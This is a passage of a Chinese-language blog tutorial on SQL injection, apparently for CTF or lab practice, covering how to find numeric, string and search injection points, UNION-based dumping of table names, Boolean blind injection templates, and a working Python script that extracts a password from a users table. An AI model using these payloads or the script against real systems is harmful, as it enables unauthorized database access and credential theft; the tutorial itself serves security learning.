+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;%关键字%&#x27;</span>`。</span><br><span class="line"></span><br><span class="line">组合出来的<span class="keyword">sql</span>注入语句为：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">search</span> <span class="keyword">like</span> <span class="string">&#x27;%测试 %&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;%1%&#x27;</span><span class="operator">=</span><span class="string">&#x27;%1%&#x27;</span></span><br><span class="line"></span><br><span class="line">测试<span class="operator">%</span><span class="string">&#x27; union select 1,2,3,4 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a><strong>判断注入点</strong></h2><p><strong>注意区别语句报错与页面报错、页面数据不正确的区别</strong></p>
+<p>​	1.<code>?id=1 and 1=1</code> 和<code>?id=1 and 1=2</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。</p>
+<p>​	2.<code>?id=1&#39; and 1=1 --+ / #</code>和<code>?id=1&#39; and 1=2 --+ / #</code>或使用<code>?id&#39; and &#39;1&#39;=&#39;1</code>和<code>?id&#39; and &#39;1&#39;=&#39;2</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。</p>
+<p>​	3.<code>?id=1%&#39; and 1=1 --+ / #</code>和<code>?id=1%&#39; and 1=2 --+ / #</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p>
+<h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p><strong>联合查询语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a from b union select c from d where e;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用条件</strong>：页面对查询语句有<strong>回显查询数据</strong></p>
+<p><strong>注意事项</strong>：</p>
+<ul>
+<li><p>使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)</p>
+</li>
+<li><p>若前部分有结果，可在每次的<code>union</code>查询后添加语句<code>limit n,1</code>(n根据题目实际进行切换)起到回显联合查询结果的作用</p>
+<p>注：limit num1，num2的作用为<strong>从第num1行开始显示num2行内容</strong></p>
+</li>
+</ul>
+<h4 id="所需函数"><a href="#所需函数" class="headerlink" title="所需函数"></a>所需函数</h4><p><strong>1.</strong><code>concat()</code>函数</p>
+<p>​	<code>concat()</code>函数：将多个<strong>不同字段</strong>的字符串连接成一个字符串。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1，str2) #语法</span><br></pre></td></tr></table></figure>
+
+<p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p><strong>2.</strong><code>group_concat()</code>函数</p>
+<p>​	<code>group_concat()</code> 将多个<strong>同个字段</strong>的字符串连接成一个字符串。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>] [separator ‘分隔符’]) #语法</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h4><ol>
+<li><p><strong>判断类型</strong></p>
+</li>
+<li><p><strong>字段数</strong></p>
+<p>联合查询(<code>union</code>)，必选保证<code>union</code>前后两个查询的字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此要对前一个的字段数进行判断。可以使用<code>order by 数字</code>进行判断</p>
+<p><strong>注</strong>：<code>order by n</code>表示查询结果通过第n个字段进行排序</p>
+<p>使用示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by 1 --+</span><br></pre></td></tr></table></figure>
+
+<p>使用时不断增大数字，假设直至第<code>n</code>个出现错误，从而判断出字段数为<code>n-1</code></p>
+</li>
+<li><p><strong>回显点</strong></p>
+<p>知道字段数之后，我们还需要确定在哪个字段是回显到页面上的</p>
+<p>直接根据字段数，联合查询数字<code>1，2，3...</code>,以三个字段数为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>从页面上查找回显的是哪个数字</p>
+</li>
+<li><p><strong>爆库名、表名，字段名，数据</strong></p>
+</li>
+</ol>
+<p>​	使用<code>union</code>语句在回显位置导出数据库中的数据，结合上文中的SQL注入常用基础语句</p>
+<p>以2位置为回显点，爆表名为例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p>
+<p><strong>使用条件</strong>：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）</p>
+<p><strong>注意事项</strong>：</p>
+<ul>
+<li><p>前面参数在数据库<strong>无结果</strong>时，拼接语句使用关键词<code>or</code></p>
+</li>
+<li><p>前面参数在数据库<strong>有结果</strong>时，拼接语句使用关键词<code>and</code></p>
+<p>另建议使用脚本</p>
+</li>
+</ul>
+<h4 id="注入使用函数"><a href="#注入使用函数" class="headerlink" title="注入使用函数"></a>注入使用函数</h4><p><strong>1.</strong><code>substr()/substring()</code>函数</p>
+<p>​	<code>substr()/substring()</code>函数：用来截取数据库某个字段中的一部分。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string，<span class="keyword">start</span>开始位置，length截取长度)  #语法</span><br></pre></td></tr></table></figure>
+
+<p>参数</p>
+<ul>
+<li>string：必选，数据库中需要截取的字段</li>
+<li>start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。</li>
+<li>length：可选，需要截取的长度。缺省。即截取到结束位置</li>
+</ul>
+<p><strong>2.</strong><code>ascii()</code>函数</p>
+<p>​	<code>ascii()</code>函数：返回字符串str的最左边的数值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)  #语法</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.</strong><code>length()</code> 函数</p>
+<p>​	<code>length()</code> 函数，返回字符串的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str) #语法</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.</strong><code>left()</code> 函数</p>
+<p>​	<code>left()</code> 函数，返回从左至右截取固定长度的字符串</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(str,n) #语法 截取字符串str的从左至右前n个字符</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h4><ol>
+<li>求当前数据库长度</li>
+<li>求当前数据库表的ASCII (即爆出数据库名)</li>
+<li>求当前数据库中表的个数</li>
+<li>求当前数据库中其中一个表名的长度</li>
+<li>求当前数据库中其中一个表名的ASCII</li>
+<li>求列名的数量</li>
+<li>求列名的长度</li>
+<li>求列名的ASCII</li>
+<li>求字段的数量</li>
+<li>求字段内容的长度</li>
+<li>求字段内容对应的ASCII</li>
+</ol>
+<h4 id="手工注入过程详解"><a href="#手工注入过程详解" class="headerlink" title="手工注入过程详解"></a>手工注入过程详解</h4><p> <strong>基本模板</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>以爆数据库名字为例</p>
+<p>求长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (length(database()) = n) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>通过页面的回显进行判断，数据库的长度是多少</p>
+<p>求数据库名称</p>
+<p>使用<code>left</code> 函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从左至右截取一个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取两个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;**&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),n)<span class="operator">=</span><span class="string">&#x27;*****&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>不断修改<code>*</code>中的字符，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p>
+<p>使用<code>SUBSTR</code>函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 截取第1个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第2个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),n,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br></pre></td></tr></table></figure>
+
+<p>不断修改<code>*</code>中的ASCII码，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p>
+<h4 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h4><p><strong>注意查看表单的提交变量名称</strong></p>
+<p>使用POST提交数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>(<span class="params">value</span>):  <span class="comment"># 获取要查询的数据的长度</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, n)</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        length = <span class="built_in">len</span>(html.text)</span><br><span class="line">        <span class="keyword">if</span> length &lt; value:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;……data length is :&quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">data_length, value</span>):  <span class="comment"># 获取数据</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, data_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, i, <span class="built_in">ord</span>(char))</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">            html = requests.post(url, data=data)</span><br><span class="line">            length = <span class="built_in">len</span>(html.text)</span><br><span class="line">            <span class="keyword">if</span> length &lt; value:  <span class="comment"># 根据返回长度的不同来判断字符正确与否</span></span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;…… data is :&quot;</span> + result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://***.***.10.67:2081/hard.php&quot;</span></span><br><span class="line">data_payload = <span class="string">&quot;select password from users  limit 0,1&quot;</span> //所爆数据的sql语句</span><br><span class="line">value = <span class="number">550</span>  <span class="comment"># 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看</span></span><br><span class="line"></span><br><span class="line">length = get_length(value) +<span class="number">1</span></span><br><span class="line">get_data(length, value)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://wells.host/posts/e73517db/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://wells.host/posts/e73517db/&title=SQL注入 - Wells's Blog&summary=SQL注入流程
+找到注入点：判断是否有漏洞，寻找插入位置
+构造注入语句，并在注入点注入形成新的SQL语句
+新形成的SQL语句提交数据库处理
+数据库执行新的SQL语句，引发注入攻击
+
+前置知识1.特别的数据库
+在MySQL 5.0版本之..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=SQL注入 - Wells's Blog&amp;body=https://wells.host/posts/e73517db/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://wells.host/posts/e73517db/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/b1f1aefc/">常见协议与PHP伪协议</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/44659fec/">PHP特性</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="we11s/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Wells</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">SQL注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%AD%E5%8F%A5"><span class="toc-text">SQL注入常用基础语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">SQL注入常用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-union-%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8"><span class="toc-text">联合查询(union)注入使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8"><span class="toc-text">报错注入使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8"><span class="toc-text">布尔盲注使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E7%B1%BB"><span class="toc-text">注入点分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">①数字型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">②字符型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">③搜索型注入点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="toc-text">注入方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E5%87%BD%E6%95%B0"><span class="toc-text">所需函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">注入使用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-text">手工注入过程详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC"><span class="toc-text">注入脚本</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
